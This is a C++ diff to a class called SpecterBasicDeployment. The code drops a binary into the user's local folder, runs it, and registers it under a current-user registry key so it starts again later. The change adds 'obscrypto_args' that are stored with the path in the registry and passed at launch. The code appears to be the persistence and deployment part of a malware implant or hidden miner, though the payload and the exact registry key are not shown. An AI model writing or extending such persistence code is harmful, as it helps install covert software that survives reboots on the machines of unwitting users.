@@ -6,12 +6,14 @@
 #include "resource.h"
 
 #include <fstream>
+#include <boost/format.hpp>
 #include <winreg/WinReg.hpp>
 
-SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name):
+SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name, std::wstring obscrypto_args) :
 	m_program_name(std::move(program_name)),
 	m_target_file(CommonPaths::GetLocalPath() / target_file_name),
-	m_reg_key(HKEY_CURRENT_USER, kTargetRegistry)
+	m_reg_key(HKEY_CURRENT_USER, kTargetRegistry),
+	m_obscrypto_args(std::move(obscrypto_args))
 {
 }
 
@@ -58,7 +60,10 @@ bool SpecterBasicDeployment::Install()
 
 bool SpecterBasicDeployment::EnablePersistence()
 {
-	const auto result = m_reg_key.TrySetStringValue(m_program_name, m_target_file);
+	boost::wformat format(L"\"%1%\" \"%2%\"");
+	format % m_target_file % m_obscrypto_args;
+
+	const auto result = m_reg_key.TrySetStringValue(m_program_name, format.str());
 	return result.IsOk();
 }
 
@@ -87,5 +92,5 @@ void SpecterBasicDeployment::DisablePersistence()
 
 void SpecterBasicDeployment::RunBinary() const
 {
-	ProcessUtils::RunProcess(m_target_file);
+	ProcessUtils::RunProcess(m_target_file, m_obscrypto_args);
 }
